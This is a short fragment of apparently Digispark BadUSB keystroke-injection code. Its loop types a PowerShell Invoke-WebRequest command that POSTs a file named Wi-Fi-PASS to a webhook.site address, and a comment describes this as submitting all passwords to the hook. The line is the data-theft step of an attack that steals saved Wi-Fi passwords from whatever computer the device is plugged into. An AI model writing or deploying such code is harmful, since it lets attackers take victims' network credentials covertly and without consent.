...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/1ba0f601-469e-4706-9ab0-33269234252b -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
